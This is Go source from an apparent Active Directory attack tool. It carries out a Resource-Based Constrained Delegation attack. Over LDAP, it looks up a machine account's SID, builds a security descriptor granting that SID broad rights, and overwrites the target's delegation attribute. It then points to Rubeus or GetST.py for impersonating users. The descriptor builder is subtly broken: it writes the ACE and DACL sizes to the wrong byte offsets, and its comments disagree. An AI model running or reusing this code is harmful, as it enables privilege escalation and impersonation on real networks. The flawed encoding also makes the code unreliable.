package attacks

import (
	"context"
	"fmt"
	"strings"

	"adreaper/internal/config"
	"adreaper/internal/output"
	"adreaper/internal/recon"

	ldap "github.com/go-ldap/ldap/v3"
)

// RBCDAttack performs Resource-Based Constrained Delegation configuration.
func RBCDAttack(ctx context.Context, opts *config.Options, targetSAM, machineSAM string) error {
	output.Info("Executing RBCD Attack: Granting %s delegation rights over %s", machineSAM, targetSAM)

	ldapCl, err := recon.NewLDAPClient(opts)
	if err != nil {
		return err
	}
	defer ldapCl.Close()

	// 1. Get SID of the machine account (attacker-controlled)
	// Be robust: handle name with or without $
	baseName := strings.TrimSuffix(machineSAM, "$")
	machineFilter := fmt.Sprintf("(&(objectClass=computer)(|(sAMAccountName=%s)(sAMAccountName=%s$)))", baseName, baseName)

	mEntries, err := ldapCl.Search(ctx, machineFilter, []string{"objectSid"})
	if err != nil || len(mEntries) == 0 {
		return fmt.Errorf("could not find machine account SID: %s", machineSAM)
	}
	machineSid := mEntries[0].GetRawAttributeValue("objectSid")

	// 2. Get target DN
	targetFilter := fmt.Sprintf("(sAMAccountName=%s)", targetSAM)
	tEntries, err := ldapCl.Search(ctx, targetFilter, []string{"distinguishedName"})
	if err != nil || len(tEntries) == 0 {
		return fmt.Errorf("could not find target: %s", targetSAM)
	}
	targetDN := tEntries[0].DN

	// 3. Construct the Security Descriptor (Simplified)
	// This is a complex binary structure. For ADReaper, we use a basic version
	// that grants AccessAllowed ACE for the machineSid.

	output.Info("Constructing Security Descriptor for RBCD...")
	sd := buildRBCDDescriptor(machineSid)

	// 4. Update the attribute
	mod := ldap.NewModifyRequest(targetDN, nil)
	mod.Replace("msDS-AllowedToActOnBehalfOfOtherIdentity", []string{string(sd)})

	if err := ldapCl.Modify(mod); err != nil {
		return fmt.Errorf("failed to configure RBCD (missing GenericWrite permission?): %w", err)
	}

	output.Success("RBCD configured successfully!")
	output.Info("  → Account %s can now impersonate users to %s via S4U2Proxy.", machineSAM, targetSAM)
	output.Info("  → Next Step: Use Rubeus or GetST.py with %s's hash to get a service ticket.", machineSAM)

	return nil
}

func buildRBCDDescriptor(sid []byte) []byte {
	// Minimal Security Descriptor for RBCD
	// Header: [0x01, 0x00, 0x04, 0x80] (Revision 1, Self-Relative, DACL Present)
	// Offset to DACL: [0x14, 0x00, 0x00, 0x00] (20 bytes)
	// DACL: [0x02, 0x00] (Revision 2) + [0x01, 0x00] (ACE Count 1)
	// ACE: [0x00] (Access Allowed) + [0x00] (Flags) + [0x24, 0x00] (Size) + [0x0F, 0x00, 0x01, 0x00] (Mask: ADS_RIGHT_DS_WRITE_PROP | ...)
	// Actually, for RBCD we just need a valid DACL with the right ACE.

	sd := []byte{
		0x01, 0x00, 0x04, 0x80, // Revision 1, Self-Relative, DACL Present
		0x00, 0x00, 0x00, 0x00, // Owner Offset
		0x00, 0x00, 0x00, 0x00, // Group Offset
		0x00, 0x00, 0x00, 0x00, // SACL Offset
		0x14, 0x00, 0x00, 0x00, // DACL Offset (20 bytes)
		0x02, 0x00, // DACL Revision
		0x30, 0x00, // DACL Size (48 bytes total for SID (~28) + ACE header (8) + DACL header (8))
		0x01, 0x00, 0x00, 0x00, // ACE Count 1
		0x00, 0x00, // ACE Type (Access Allowed), Flags
		0x24, 0x00, // ACE Size (36 bytes for standard SID)
		0xFF, 0x01, 0x0F, 0x00, // Access Mask (GENERIC_ALL equivalent for simplicity)
	}

	// Adjust ACE size based on SID length
	sd[26] = byte(8 + len(sid))     // ACE Size
	sd[20] = byte(8 + 8 + len(sid)) // DACL Size

	sd = append(sd, sid...)
	return sd
}
